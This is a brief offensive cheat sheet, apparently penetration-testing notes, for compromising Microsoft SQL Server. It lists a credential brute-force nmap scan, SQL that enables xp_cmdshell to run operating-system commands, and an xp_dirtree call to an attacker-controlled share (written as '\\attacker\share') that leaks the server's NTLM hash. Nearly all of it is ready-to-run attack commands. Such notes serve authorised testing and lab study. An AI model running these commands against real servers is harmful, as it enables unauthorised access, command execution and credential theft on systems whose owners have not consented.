# MSSQL

**Port:** 1433

**Quick Checklist**
- [ ] Valid credentials?
- [ ] `xp_cmdshell` enabled?
- [ ] Linked servers?
- [ ] Can capture NTLM hash?

```bash
mssqlclient.py user:pass@IP
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-brute IP
```

**xp_cmdshell**
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**NTLM Capture**
```sql
EXEC xp_dirtree '\\attacker\share';
```
